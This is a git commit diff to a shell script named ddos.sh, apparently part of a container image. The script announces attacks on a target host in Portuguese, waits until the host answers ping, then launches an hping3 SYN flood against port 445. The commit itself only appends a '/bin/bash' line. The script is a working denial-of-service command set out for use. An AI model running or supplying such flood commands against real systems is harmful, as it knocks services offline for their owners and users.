1e7df5a20f9f28cc9a2bcc0519fbbf9bc493e507
rafaelpinheiroo1 <rafaelpinheiro.380@gmail.com>
2022-06-15 01:20:42 +0000

    code updade

--- images/ddos_image/ddos.sh
+++ images/ddos_image/ddos.sh
@@ -6,3 +6,4 @@ echo "Disparando ataques para o host:"
 echo ${TARGET}
 while true; do ping -c1 ${TARGET} > /dev/null && break; done
 hping3 -c 10000 -d 1024 -S -w 64 -p 445 --flood ${TARGET}
+/bin/bash
